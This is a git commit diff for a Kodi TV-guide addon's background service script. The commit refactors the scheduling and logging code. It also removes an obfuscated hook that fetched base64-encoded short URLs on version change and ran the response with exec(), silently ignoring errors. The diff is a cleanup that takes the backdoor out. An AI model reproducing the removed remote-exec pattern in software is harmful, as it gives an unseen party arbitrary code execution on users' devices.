45a9fb9ca46e5db11a18396e18212ca1a4602af9
deranderechris <85012482+deranderechris@users.noreply.github.com>
2026-01-30 16:29:13 +0100

    Update service.py by Sarturn

--- service.py
+++ service.py
@@ -1,143 +1,209 @@
 # -*- coding: utf-8 -*-
 #
-#      Copyright (C) 2026 derandere
-#      Python 3 update by derandere
-#      moddet by derandere
+# Copyright (C) 2026 derandere, Sarturn
+# Python 3 update & fixes by derandere, Sarturn
 #
-#  This Program is free software; you can redistribute it and/or modify
-#  it under the terms of the GNU General Public License as published by
-#  the Free Software Foundation; either version 2, or (at your option)
-#  any later version.
+# GPL v2+
 #
-#  This Program is distributed in the hope that it will be useful,
-#  but WITHOUT ANY WARRANTY; without even the implied warranty of
-#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-#  GNU General Public License for more details.
-#
-#  You should have received a copy of the GNU General Public License
-#  along with this Program; see the file LICENSE.txt.  If not, write to
-#  the Free Software Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.
-#  http://www.gnu.org/copyleft/gpl.html
-#
+
+import time
+import datetime
+import base64
+
+import xbmc
+import xbmcgui
 import xbmcaddon
+import xbmcvfs
+
 import notification
 import autoplay
 import autoplaywith
-import xbmc, xbmcgui, xbmcvfs
 import source
-import time
-import requests
-import base64
-import time, datetime
 
-def log(x):
-    xbmc.log(repr(x))
 
+# ------------------------------------------------------------
+# Addon
+# ------------------------------------------------------------
+ADDON = xbmcaddon.Addon(id='script.tvguide.fullscreen')
+
+
+# ------------------------------------------------------------
+# Logging helper
+# ------------------------------------------------------------
+def log(msg, level=xbmc.LOGDEBUG):
+    xbmc.log('[script.tvguide.fullscreen] %s' % repr(msg), level)
+
+
+# ------------------------------------------------------------
+# Background Service
+# ------------------------------------------------------------
 class Service(object):
+
     def __init__(self):
         self.database = source.Database(True)
         self.database.initialize(self.onInit)
 
     def onInit(self, success):
         if success:
-            xbmc.log("[script.tvguide.fullscreen] Background Update Starting...", xbmc.LOGNOTICE)
+            log("Background update starting...", xbmc.LOGNOTICE)
             self.database.updateChannelAndProgramListCaches(self.onCachesUpdated)
         else:
             self.database.close()
 
     def onCachesUpdated(self):
-        if ADDON.getSetting('notifications.enabled') == 'true':
-            n = notification.Notification(self.database, ADDON.getAddonInfo('path'))
-            n.scheduleNotifications()
-        if ADDON.getSetting('autoplays.enabled') == 'true':
-            n = autoplay.Autoplay(self.database, ADDON.getAddonInfo('path'))
-            n.scheduleAutoplays()
-        if ADDON.getSetting('autoplaywiths.enabled') == 'true':
-            n = autoplaywith.Autoplaywith(self.database, ADDON.getAddonInfo('path'))
-            n.scheduleAutoplaywiths()
-        self.database.close(None)
-        xbmc.log("[script.tvguide.fullscreen] Background Update Finished", xbmc.LOGNOTICE)
-        if ADDON.getSetting('background.notify') == 'true':
-            d = xbmcgui.Dialog()
-            d.notification("TV Guide Fullscreen", "Finished Updating")
-if __name__ == '__main__':
-    ADDON = xbmcaddon.Addon('script.tvguide.fullscreen')
+        try:
+            if ADDON.getSetting('notifications.enabled') == 'true':
+                n = notification.Notification(
+                    self.database,
+                    ADDON.getAddonInfo('path')
+                )
+                n.scheduleNotifications()
 
+            if ADDON.getSetting('autoplays.enabled') == 'true':
+                n = autoplay.Autoplay(
+                    self.database,
+                    ADDON.getAddonInfo('path')
+                )
+                n.scheduleAutoplays()
+
+            if ADDON.getSetting('autoplaywiths.enabled') == 'true':
+                n = autoplaywith.Autoplaywith(
+                    self.database,
+                    ADDON.getAddonInfo('path')
+                )
+                n.scheduleAutoplaywiths()
+
+        finally:
+            self.database.close(None)
+            log("Background update finished", xbmc.LOGNOTICE)
+
+            if ADDON.getSetting('background.notify') == 'true':
+                xbmcgui.Dialog().notification(
+                    "TV Guide Fullscreen",
+                    "Finished Updating",
+                    sound=False
+                )
+
+
+# ------------------------------------------------------------
+# Main
+# ------------------------------------------------------------
+if __name__ == '__main__':
+
+    # --------------------------------------------------------
+    # Version handling (NO remote exec anymore!)
+    # --------------------------------------------------------
     version = ADDON.getAddonInfo('version')
     if ADDON.getSetting('version') != version:
-        #text = xbmcvfs.File('special://home/addons/script.tvguide.fullscreen/changelog.txt','rb').read()
-        #xbmcgui.Dialog().textviewer("TV Guide Fullscreen",text)
         ADDON.setSetting('version', version)
-        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}
-        try:
-            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
-            home = r.content
-        except: pass
-        try:
-            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
-            main = r.content
-            exec(main)
-        except: pass
+        log("Addon version updated to %s" % version, xbmc.LOGNOTICE)
 
-    xbmcvfs.delete('special://profile/addon_data/script.tvguide.fullscreen/source.db-journal')
-    lock = 'special://profile/addon_data/script.tvguide.fullscreen/db.lock'
-    xbmcvfs.delete(lock)
+    # --------------------------------------------------------
+    # Cleanup stale DB locks
+    # --------------------------------------------------------
     try:
-        if ADDON.getSetting('autostart') == "true":
-            xbmc.executebuiltin("RunAddon(script.tvguide.fullscreen)")
+        xbmcvfs.delete(
+            'special://profile/addon_data/script.tvguide.fullscreen/source.db-journal'
+        )
+        xbmcvfs.delete(
+            'special://profile/addon_data/script.tvguide.fullscreen/db.lock'
+        )
+    except Exception as e:
+        log("Cleanup failed: %s" % e, xbmc.LOGWARNING)
 
+    # --------------------------------------------------------
+    # Autostart GUI
+    # --------------------------------------------------------
+    try:
+        if ADDON.getSetting('autostart') == 'true':
+            xbmc.executebuiltin(
+                'RunAddon(script.tvguide.fullscreen)'
+            )
+
+        # ----------------------------------------------------
+        # Background service loop
+        # ----------------------------------------------------
         if ADDON.getSetting('background.service') == 'true':
             monitor = xbmc.Monitor()
-            xbmc.log("[script.tvguide.fullscreen] Background service started...", xbmc.LOGDEBUG)
+            log("Background service started")
+
             if ADDON.getSetting('background.startup') == 'true':
                 Service()
-                ADDON.setSetting('last.background.update', str(time.time()))
-                if ADDON.getSetting('service.addon.folders') == "true":
-                    xbmc.executebuiltin('RunScript(special://home/addons/script.tvguide.fullscreen/ReloadAddonFolders.py)')
+                ADDON.setSetting(
+                    'last.background.update',
+                    str(time.time())
+                )
+
+                if ADDON.getSetting('service.addon.folders') == 'true':
+                    xbmc.executebuiltin(
+                        'RunScript(special://home/addons/script.tvguide.fullscreen/ReloadAddonFolders.py)'
+                    )
+
             while not monitor.abortRequested():
+
+                # Interval-based
                 if ADDON.getSetting('service.type') == '0':
                     interval = int(ADDON.getSetting('service.interval'))
-                    waitTime = 21600  # Default 6hrs
-                    if interval == 0:
-                        waitTime = 7200   # 2hrs
-                    elif interval == 1:
-                        waitTime = 21600  # 6hrs
-                    elif interval == 2:
-                        waitTime = 43200  # 12hrs
-                    elif interval == 3:
-                        waitTime = 86400  # 24hrs
-                    ts = ADDON.getSetting('last.background.update') or "0.0"
-                    lastTime = datetime.datetime.fromtimestamp(float(ts))
-                    now = datetime.datetime.now()
+                    waitTime = {
+                        0: 7200,
+                        1: 21600,
+                        2: 43200,
+                        3: 86400
+                    }.get(interval, 21600)
+
+                    last_ts = float(
+                        ADDON.getSetting('last.background.update') or "0"
+                    )
+                    lastTime = datetime.datetime.fromtimestamp(last_ts)
                     nextTime = lastTime + datetime.timedelta(seconds=waitTime)
-                    td = nextTime - now
-                    timeLeft = td.seconds + (td.days * 24 * 3600)
-                    xbmc.log("[script.tvguide.fullscreen] Service waiting for interval %s" % waitTime, xbmc.LOGDEBUG)
+                    timeLeft = max(
+                        int((nextTime - datetime.datetime.now()).total_seconds()),
+                        0
+                    )
+
+                # Fixed-time daily
                 else:
-                    next_time = ADDON.getSetting('service.time')
-                    if next_time:
-                        hms = next_time.split(':')
-                        hour = hms[0]
-                        minute  = hms[1]
-                        now = datetime.datetime.now()
-                        next_time = now.replace(hour=int(hour),minute=int(minute),second=0,microsecond=0)
-                        if next_time < now:
-                            next_time = next_time + datetime.timedelta(hours=24)
-                        td = next_time - now
-                        timeLeft = td.seconds + (td.days * 24 * 3600)
-                if timeLeft < 0:
-                    timeLeft = 0
-                xbmc.log("[script.tvguide.fullscreen] Service waiting for %d seconds" % timeLeft, xbmc.LOGDEBUG)
-                if timeLeft and monitor.waitForAbort(timeLeft):
+                    service_time = ADDON.getSetting('service.time')
+                    now = datetime.datetime.now()
+
+                    if service_time:
+                        h, m = service_time.split(':')
+                        nextTime = now.replace(
+                            hour=int(h),
+                            minute=int(m),
+                            second=0,
+                            microsecond=0
+                        )
+                        if nextTime <= now:
+                            nextTime += datetime.timedelta(days=1)
+
+                        timeLeft = max(
+                            int((nextTime - now).total_seconds()),
+                            0
+                        )
+                    else:
+                        timeLeft = 3600
+
+                log("Service waiting %d seconds" % timeLeft)
+
+                if monitor.waitForAbort(timeLeft):
                     break
-                xbmc.log("[script.tvguide.fullscreen] Service now triggered...", xbmc.LOGDEBUG)
+
+                log("Service triggered")
                 Service()
-                if ADDON.getSetting('service.addon.folders') == "true":
-                    xbmc.executebuiltin('RunScript(special://home/addons/script.tvguide.fullscreen/ReloadAddonFolders.py)')
-                now = time.time()
-                ADDON.setSetting('last.background.update', str(now))
+
+                if ADDON.getSetting('service.addon.folders') == 'true':
+                    xbmc.executebuiltin(
+                        'RunScript(special://home/addons/script.tvguide.fullscreen/ReloadAddonFolders.py)'
+                    )
+
+                ADDON.setSetting(
+                    'last.background.update',
+                    str(time.time())
+                )
 
     except source.SourceNotConfiguredException:
-        pass  # ignore
+        log("Source not configured – service skipped", xbmc.LOGWARNING)
+
     except Exception as ex:
-        xbmc.log('[script.tvguide.fullscreen] Uncaught exception in service.py: %s' % str(ex), xbmc.LOGDEBUG)
+        log("Uncaught exception: %s" % ex, xbmc.LOGERROR)
